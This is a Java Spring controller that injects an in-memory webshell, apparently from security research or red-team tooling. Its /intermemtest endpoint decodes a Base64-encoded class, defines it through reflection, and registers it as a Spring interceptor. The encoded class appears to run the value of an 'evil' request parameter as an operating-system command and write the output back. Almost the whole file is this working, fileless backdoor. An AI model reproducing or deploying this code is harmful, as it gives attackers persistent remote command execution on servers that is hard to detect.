package com.axisx.common.controller;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;
import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.lang.reflect.Method;
import java.util.Base64;

@Controller
public class InjectInterceptorMem {
    private static Object MEMSHELL_OBJECT;

    @RequestMapping("/intermemtest")
    public void index(HttpServletRequest request, HttpServletResponse response) {
        InjectMemClass();
        InjectMem();
    }

    private static synchronized void InjectMem() {
        try {
            WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
            // 从context中获取AbstractHandlerMapping的实例对象
            org.springframework.web.servlet.handler.AbstractHandlerMapping abstractHandlerMapping = (org.springframework.web.servlet.handler.AbstractHandlerMapping)context.getBean("org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping");
            // 反射获取adaptedInterceptors属性
            java.lang.reflect.Field field = org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");
            field.setAccessible(true);
            java.util.ArrayList<Object> adaptedInterceptors = (java.util.ArrayList<Object>)field.get(abstractHandlerMapping);
            // 避免重复添加
            for (int i = adaptedInterceptors.size() - 1; i > 0; i--) {
                if (adaptedInterceptors.get(i) instanceof NewInterceptorMem) {
                    System.out.println("已经添加过TestInterceptor实例了");
                }
            }
            adaptedInterceptors.add(MEMSHELL_OBJECT);
        }catch (Exception e){
            e.printStackTrace();
        }


    }

    public static synchronized void InjectMemClass() {
        try {
            // TestInterceptor
            byte[] var2 = Base64.getDecoder().decode("yv66vgAAADQAlwoAHgBZCABaCwBbAFwKAB0AXQsAXgBfCgBgAGEHAGIKAGMAZAoAYwBlCgBmAGcHAGgKAAsAaQcAagoADQBrBwBsCgAPAFkKAA0AbQcAbgoAEgBZCgASAG8IAHAKABIAcQoADwByCgAPAHEJAHMAdAgATwoAdQBhCABTBwB2BwB3BwB4AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABFMVGVzdEludGVyY2VwdG9yOwEACXByZUhhbmRsZQEAZChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7TGphdmEvbGFuZy9PYmplY3Q7KVoBAAZyZXN1bHQBABJMamF2YS9sYW5nL1N0cmluZzsBAAdyZXF1ZXN0AQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQAIcmVzcG9uc2UBAChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQAHaGFuZGxlcgEAEkxqYXZhL2xhbmcvT2JqZWN0OwEAA2NtZAEADVN0YWNrTWFwVGFibGUHAHYHAHkHAHoHAHcHAHsHAGIBAApFeGNlcHRpb25zAQALQ29tbWFuZEV4ZWMBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAAnJ0AQATTGphdmEvbGFuZy9SdW50aW1lOwEABHByb2MBABNMamF2YS9sYW5nL1Byb2Nlc3M7AQAGc3RkZXJyAQAVTGphdmEvaW8vSW5wdXRTdHJlYW07AQADaXNyAQAbTGphdmEvaW8vSW5wdXRTdHJlYW1SZWFkZXI7AQACYnIBABhMamF2YS9pby9CdWZmZXJlZFJlYWRlcjsBAARsaW5lAQACc2IBABhMamF2YS9sYW5nL1N0cmluZ0J1ZmZlcjsHAHwHAH0HAH4HAGgHAGoHAGwBAApwb3N0SGFuZGxlAQCSKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTtMamF2YS9sYW5nL09iamVjdDtMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9Nb2RlbEFuZFZpZXc7KVYBAAxtb2RlbEFuZFZpZXcBAC5Mb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9Nb2RlbEFuZFZpZXc7AQAPYWZ0ZXJDb21wbGV0aW9uAQB5KExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTtMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL0V4Y2VwdGlvbjspVgEAAmV4AQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQAKU291cmNlRmlsZQEAFFRlc3RJbnRlcmNlcHRvci5qYXZhDAAgACEBAARldmlsBwB5DAB/ADsMADoAOwcAegwAgACBBwCCDACDAIQBABNqYXZhL2xhbmcvRXhjZXB0aW9uBwB8DACFAIYMAIcAiAcAfQwAiQCKAQAZamF2YS9pby9JbnB1dFN0cmVhbVJlYWRlcgwAIACLAQAWamF2YS9pby9CdWZmZXJlZFJlYWRlcgwAIACMAQAWamF2YS9sYW5nL1N0cmluZ0J1ZmZlcgwAjQCOAQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIMAI8AkAEAAQoMAJEAjgwAjwCSBwCTDACUAJUHAJYBAA9UZXN0SW50ZXJjZXB0b3IBABBqYXZhL2xhbmcvT2JqZWN0AQAyb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9IYW5kbGVySW50ZXJjZXB0b3IBACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0AQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UBABBqYXZhL2xhbmcvU3RyaW5nAQARamF2YS9sYW5nL1J1bnRpbWUBABFqYXZhL2xhbmcvUHJvY2VzcwEAE2phdmEvaW8vSW5wdXRTdHJlYW0BAAxnZXRQYXJhbWV0ZXIBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAE2phdmEvaW8vUHJpbnRXcml0ZXIBAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQATKExqYXZhL2lvL1JlYWRlcjspVgEACHJlYWRMaW5lAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwEALChMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWZmZXI7AQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0AIQAdAB4AAQAfAAAABQABACAAIQABACIAAAAvAAEAAQAAAAUqtwABsQAAAAIAIwAAAAYAAQAAAAoAJAAAAAwAAQAAAAUAJQAmAAAAAQAnACgAAgAiAAAAvgACAAYAAAAkKxICuQADAgA6BCoZBLYABDoFLLkABQEAGQW2AAanAAU6BQSsAAEACgAdACAABwADACMAAAAaAAYAAAANAAoAEAASABEAHQATACAAEgAiABQAJAAAAD4ABgASAAsAKQAqAAUAAAAkACUAJgAAAAAAJAArACwAAQAAACQALQAuAAIAAAAkAC8AMAADAAoAGgAxACoABAAyAAAAHAAC/wAgAAUHADMHADQHADUHADYHADcAAQcAOAEAOQAAAAQAAQAHAAEAOgA7AAIAIgAAASkAAwAJAAAAYLgACE0sK7YACU4ttgAKOgS7AAtZGQS3AAw6BbsADVkZBbcADjoGAToHuwAPWbcAEDoIGQa2ABFZOgfGACAZCLsAElm3ABMZB7YAFBIVtgAUtgAWtgAXV6f/2xkItgAYsAAAAAMAIwAAACoACgAAABgABAAZAAoAGgAQABsAGwAcACYAHQApAB4AMgAgAD0AIQBaACQAJAAAAFwACQAAAGAAJQAmAAAAAABgADEAKgABAAQAXAA8AD0AAgAKAFYAPgA/AAMAEABQAEAAQQAEABsARQBCAEMABQAmADoARABFAAYAKQA3AEYAKgAHADIALgBHAEgACAAyAAAAJQAC/wAyAAkHADMHADcHAEkHAEoHAEsHAEwHAE0HADcHAE4AACcAOQAAAAQAAQAHAAEATwBQAAIAIgAAAF8AAgAFAAAACbIAGRIatgAbsQAAAAIAIwAAAAoAAgAAACkACAAqACQAAAA0AAUAAAAJACUAJgAAAAAACQArACwAAQAAAAkALQAuAAIAAAAJAC8AMAADAAAACQBRAFIABAA5AAAABAABAAcAAQBTAFQAAgAiAAAAXwACAAUAAAAJsgAZEhy2ABuxAAAAAgAjAAAACgACAAAALgAIAC8AJAAAADQABQAAAAkAJQAmAAAAAAAJACsALAABAAAACQAtAC4AAgAAAAkALwAwAAMAAAAJAFUAVgAEADkAAAAEAAEABwABAFcAAAACAFg=");
            Method var1 = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
            var1.setAccessible(true);

            Class var3 = (Class) var1.invoke(Thread.currentThread().getContextClassLoader(), var2, 0, var2.length);
            MEMSHELL_OBJECT = var3.newInstance();
        } catch (Exception var4) {
            var4.printStackTrace();
        }
    }
}
